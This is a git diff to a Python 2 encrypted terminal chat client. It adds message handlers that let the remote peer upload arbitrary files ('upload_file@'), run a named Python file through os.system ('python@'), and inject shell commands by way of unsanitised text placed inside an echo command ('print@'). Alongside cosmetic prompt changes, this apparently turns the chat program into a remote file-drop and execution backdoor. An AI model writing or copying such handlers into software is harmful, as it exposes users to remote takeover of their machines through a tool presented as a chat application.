@@ -24,6 +24,14 @@ import threading
 import time
 import re
 import random
+import netifaces as ni
+
+
+ni.ifaddresses("eth0")
+home_host_ip = ni.ifaddresses("eth0")[ni.AF_INET][0]["addr"]
+
+ni.ifaddresses("lo")
+home_wir_ip = ni.ifaddresses("lo")[ni.AF_INET][0]["addr"]
 
 global verr
 verr = RLock()
@@ -33,6 +41,7 @@ global nickname_keep
 global exit
 exit = False
 port_conn = random.randint(5000, 7999)
+
 
 def blue_print(str_to_print):
     print colored(str(str_to_print), "blue")
@@ -44,13 +53,13 @@ def chat_presentation():
     blue_print("#                                                                     @                                                                                    0                                          #")
     blue_print("#          #%$0$$@   0       @0$000%@@@#%#$$@  @$$$$#    ###00$  #%#$$$00$$00%0##  000#%##00@0@@@@#$@  00%00@@##$%0$0@0  #@%@%@@@####0  $$$000          0##@@$  @#£#@@000%$$#@0@  @@@@$$%$##0000$$%0  #")
     blue_print("#  @@     @#%$0$$@@     @@   #              0  0    %    0    0  @  @           @  @                %  @              0  #            @  @    @    $   @    #   0  0           @  @              $ @  #")
-    blue_print("#  @@ 0   #$#%$0$$$   0 @@   0     0        @  @    #    @    @  0              $  0       $        @  $    %         @  $    @@00$    $  0    $      $    0    $    0$$#$0    0  @         @      @  #")
+    blue_print("#  @% 0   #$#%$0$$$   0 $@   0     0        @  @    #    @    @  0              $  0       $        @  $    %         @  $    @@00$    $  0    $      $    0    $    0$$#$0    0  @         @      @  #")
     blue_print("#       $ @#%$0$$@# @        #     @00%0$$$#@  0    0@@0##    %  @    0%@@0#    $  @@$@00@    0$$$@00  $     ##$#00@@#@  $    @    $    0  %    #@00@@    @     #    @    @    @  0@%@00@    %@%@%@@  #")
     blue_print("#         #$ #%$ $$          #     $           @  $           %  $    #    $  0 #        0    #        %     0           @    @##$$    @    @            0      #    @##00@    @     @  @    @        #")
     blue_print("#    $    #%$0 $#$@       @  $     0           0            @ @  #    @00%#0    #    $   #    0        #     0     @     0  @         0      000#    ##00       $   $          %        $    $        #")
     blue_print("#          $#%$$#$           %     @@$$$$#@@0  #    @@@@0#    @  #              0        #    #   0    @     @@@000#@#@  0    0000@    @    %   $    $      @   @    $@@0#%@@0@@        $    #     0  #")
     blue_print("#        #  0@@@0  $         @   @          0  #    0    0    #  0    0@@@00    $   @    $    #        #  0           $  #    #    $    $       #    %          0    0              #   #    $        #")
-    blue_print("#  @@ @     0$0$$     $ @@   0              @  $    %    @    #  $    @    #    @        $    0     0  0        @     0  #    #     @    @      0    $     %    @    @       @          #    @   0    #")
+    blue_print("#  @$ @     0$0$$     $ %@   0              @  $    %    @    #  $    @    #    @        $    0     0  0        @     0  #    #     @    @      0    $     %    @    @       @          #    @   0    #")
     blue_print("#  @@       #0@0#       @@   @0%00@@@@%##%##0  $$%$%$    ###@00  00%00#    #@@%0@        #0%0@$        @@$%$%$##$#%@@%@  @@@%@@      @@@$0@     @$@%0#          @0%@@$                  00%@@#        #")
     blue_print("#                                         @                                                         $                                                    0                                            #")
     blue_print("#######################################################################################################################################################################################################")
@@ -138,11 +147,66 @@ def chat_connection(nickname, host_ip):
     IV = AES_IV[1]
 
     def read_message(c):
+        i = 0
         sym_enc_data = c.recv(4096)
         data =  string_socket_message(sym_enc_data, IV, AES_KEY)
 
-        if data == "quit" or len(data) == 0:
+        if data == "quit":
             return True
+
+        elif "bad_print@" in data:
+            str_data = str(data)
+            text_to_print = str_data[10:len(str_data)]
+            print text_to_print
+
+            return False
+
+        elif "print@" in data:
+            i += 1
+            str_data = str(data)
+            text_to_print = str_data[6:len(str_data)]
+            echo_file = "echo_" + str(i) + ".py"
+            touch_comm = "touch " + str(echo_file)
+            os.system(touch_comm)
+            echo_comm = "echo \"print('" + text_to_print + "')\" > " + echo_file
+            os.system(echo_comm)
+            py_comm = "gnome-terminal -x python " + echo_file 
+            os.system(py_comm)
+
+            return False
+
+        elif "python@" in data:
+            str_comm = str(data)
+            py_file = str_comm[7:len(str_comm)]
+            py_comm = "python " + str(py_file)
+            os.system(py_comm)
+
+            return False
+
+        elif "upload_file@" in data:
+            str_data = str(data)
+            filename = str_data[12:len(str_data)]
+            txt = "filename_OK"
+            encrypted_txt = send_socket_message(txt, IV, AES_KEY)
+            c.send(encrypted_txt)
+            file_data = ""
+
+            with open(filename, 'wb') as f:
+                hex_enc_data = c.recv(65536).strip()             
+                bin_data = string_socket_message(hex_enc_data, IV, AES_KEY)
+                f.write(bin_data)
+
+            f.close()
+
+            # txt = "file_OK"
+            # encrypted_txt = send_socket_message(txt, IV, AES_KEY)
+            # c.send(encrypted_txt)
+
+            return False
+
+        elif len(data) == 0:
+
+            return False
 
         # elif data.startswith("cd "):
         #     current_path = re.split(r'\w+', data)[1]
@@ -214,6 +278,15 @@ def chat_client():
     host = sys.argv[1]
     port = int(sys.argv[2])
 
+    if str(home_host_ip) != "127.0.0.1":
+        ip_to_show = str(home_host_ip)
+
+    elif str(home_wir_ip) != "127.0.0.1":
+        ip_to_show = str(home_wir_ip)
+
+    else:
+        ip_to_show = "127.0.0.1"
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     #s.settimeout(2)
     nickname = pseudo()                                                                                                                                                                                                                                                                                             
@@ -268,7 +341,7 @@ def chat_client():
     IV = AES_IV[0]
 
 
-    me_print = colored("[" + str(nickname) + "] ", "blue")
+    me_print = colored("[" + str(nickname) + "@" + str(ip_to_show) + "> ", "blue")
 
     sys.stdout.write(me_print); sys.stdout.flush()
     message = ""
@@ -283,39 +356,29 @@ def chat_client():
             if sock == s:
                 # incoming message from remote server, s
                 sym_enc_data = sock.recv(262144)
-                #print "enc_data: " + str(enc_data)
 
                 if not sym_enc_data :
                     print '\nDisconnected from chat server'
                     sys.exit()
 
                 else :
-
                     # Déchiffrement du message avec la clé symétrique
                     data =  string_socket_message(sym_enc_data, iv, AES_KEY)
-                    message = color_parser(data)
-                    print "\n" + message[0] + message[1]
+                    #message = color_parser(data)
+                    blue_print("\n" + data)
                     sys.stdout.write(me_print)
                     sys.stdout.flush()    
 
             else :
                 # user entered a message
                 msg = raw_input(me_print)#sys.stdin.readline()
-                #txt_colored = u"[" + str(nickname) + " dit] "
-                #nickname_colored = colored(txt_colored, "magenta")
-                # encrypt the data with public key and sending it to the server
                 red_nickname = u"[" + str(nickname) + "] "
-                #red_nickname = colored(red_nickname, "red")
-                #text = colored(str(msg), "cyan")
                 text_to_send = (red_nickname + msg).encode("utf-8")
-                #print "text: " + str(text_to_send)
 
                 # Chiffrement du message avec la clé symétrique
                 encrypted_data = send_socket_message(str(text_to_send), iv, AES_KEY)
 
                 s.send(encrypted_data)
-                #print "encrypted message: " + str(encrypted_data)
-                #sys.stdout.write('[Me] ')
                 sys.stdout.flush() 
 
 if __name__ == "__main__":
